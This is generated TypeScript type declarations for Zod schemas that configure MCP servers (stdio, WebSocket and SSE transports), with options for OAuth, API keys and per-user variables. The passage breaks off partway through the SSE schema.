import { z } from 'zod';
import { TokenExchangeMethodEnum } from './types/agents';
export declare const StdioOptionsSchema: z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"stdio">>;
    obo: z.ZodOptional<z.ZodUndefined>;
    /**
     * The executable to run to start the server.
     */
    command: z.ZodString;
    /**
     * Command line arguments to pass to the executable.
     */
    args: z.ZodArray<z.ZodString, "many">;
    /**
     * The environment to use when spawning the process.
     *
     * If not specified, the result of getDefaultEnvironment() will be used.
     * Environment variables can be referenced using ${VAR_NAME} syntax.
     */
    env: z.ZodEffects<z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>, Record<string, string> | undefined, Record<string, string> | undefined>;
    /**
     * How to handle stderr of the child process.
     * Accepts: 'pipe' | 'ignore' | 'inherit' | file descriptor number.
     * Defaults to "inherit".
     */
    stderr: z.ZodOptional<z.ZodUnion<[z.ZodEnum<["pipe", "ignore", "inherit"]>, z.ZodNumber]>>;
}, "strip", z.ZodTypeAny, {
    type: "stdio";
    command: string;
    args: string[];
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    env?: Record<string, string> | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
    stderr?: number | "pipe" | "ignore" | "inherit" | undefined;
}, {
    command: string;
    args: string[];
    type?: "stdio" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    env?: Record<string, string> | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
    stderr?: number | "pipe" | "ignore" | "inherit" | undefined;
}>;
export declare const WebSocketOptionsSchema: z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"websocket">>;
    obo: z.ZodOptional<z.ZodUndefined>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "websocket";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
}, {
    url: string;
    type?: "websocket" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
}>;
export declare const SSEOptionsSchema: z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
